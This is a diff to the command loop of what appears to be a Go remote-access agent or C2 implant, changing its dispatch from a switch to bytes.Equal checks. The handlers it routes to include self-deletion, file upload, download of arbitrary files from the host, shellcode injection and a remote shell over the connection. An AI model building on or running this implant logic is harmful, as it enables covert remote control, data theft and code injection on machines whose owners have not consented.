@@ -72,13 +72,12 @@ func StartAgent(userOP *config.UserOperation) {
 			if err != nil || curRtCmd == nil {
 				log.Fatalln("Error when Parsing Incoming RTCMD.")
 			}
-			switch curRtCmd.Command {
-			case []byte(selfDestroyCmd):
+			if bytes.Equal(curRtCmd.Command, []byte(selfDestroyCmd)) {
 				remoteop.DeleteMyself()
 				sendSuccess()
 				_ = curConn.Close()
 				return
-			case []byte(uploadCmd):
+			} else if bytes.Equal(curRtCmd.Command, []byte(uploadCmd)) {
 				if curRtCmd.HasData == byte(0) || len(curRtCmd.RealData) < 1 || len(curRtCmd.FilePathRemote) < 2 {
 					log.Println("Remote Data Received, but seems built in an illegal way.")
 				}
@@ -87,7 +86,7 @@ func StartAgent(userOP *config.UserOperation) {
 					log.Println(err)
 				}
 				sendSuccess()
-			case []byte(downloadCmd):
+			} else if bytes.Equal(curRtCmd.Command, []byte(downloadCmd)) {
 				fddt, err := ioutil.ReadFile(string(curRtCmd.FilePathRemote))
 				if len(fddt) == 0 || fddt == nil || err != nil {
 					log.Println("Failed to read original data.")
@@ -112,17 +111,17 @@ func StartAgent(userOP *config.UserOperation) {
 					continue
 				}
 				sendSuccess()
-			case []byte(injectShellCodeCmd):
+			} else if bytes.Equal(curRtCmd.Command, []byte(injectShellCodeCmd)){
 				if curRtCmd.HasData != byte(1) {
 					log.Fatalln("Internal Error.")
 				}
 				remoteop.InjectShellcode(string(curRtCmd.RealData))
 				sendSuccess()
-			case []byte(getShellCmd):
+			} else if bytes.Equal(curRtCmd.Command, []byte(getShellCmd)){
 				// no ping-back send out.
 				remoteop.GetShell(curConn)
 				continue
-			default:
+			} else {
 				log.Fatalln("Error when trying to find valid commands from remote.")
 			}
 		}
